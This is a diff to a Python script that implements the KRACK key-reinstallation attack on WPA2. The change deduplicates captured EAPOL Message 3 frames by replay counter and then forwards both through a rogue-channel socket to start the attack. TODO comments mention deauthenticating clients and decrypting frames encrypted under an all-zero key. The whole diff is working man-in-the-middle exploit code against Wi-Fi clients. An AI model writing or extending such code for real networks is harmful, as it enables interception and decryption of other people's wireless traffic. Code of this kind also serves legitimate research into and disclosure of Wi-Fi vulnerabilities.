@@ -13,8 +13,6 @@ from wpaspy import Ctrl
 # - If EAPOL-Msg4 has been received on the real channel, the attack has failed
 # - Detect when all frames are sent on the real channel, and if so, deauthenticate
 #
-# - Test that we indeed have two different Msg3's, and not just retransmissions
-#
 # - Delete created *sta virtual interfaces
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
 # - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
@@ -357,6 +355,12 @@ class ClientState():
 		self.msg4 = None
 		self.krack_finished = False
 
+	def add_if_new_msg3(self, msg3):
+		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
+			return
+		self.msg3s.append(msg3)
+
+
 	def update_state(self, state):
 		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
 		self.state = state
@@ -556,18 +560,19 @@ class KRAckAttack():
 			if might_forward:
 				client = self.clients[p.addr1]
 
+				# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
 				eapolnum = get_eapol_msgnum(p)
-				if eapolnum == 3:
-					client.msg3s.append(p)
+				if eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
+					client.add_if_new_msg3(p)
 					# FIXME: This may cause a timeout on the client side???
 					if len(client.msg3s) >= 2:
-						log(STATUS, "Got 2nd EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
+						log(STATUS, "Got 2nd unique EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
 						for p in client.msg3s: self.sock_rogue.send(p)
 						client.msg3s = []
 						# TODO: Should extra stuff be done here?	
 						client.attack_start()
 					else:
-						log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
+						log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
 
 				elif Dot11Deauth in p:
 					del self.clients[p.addr1]
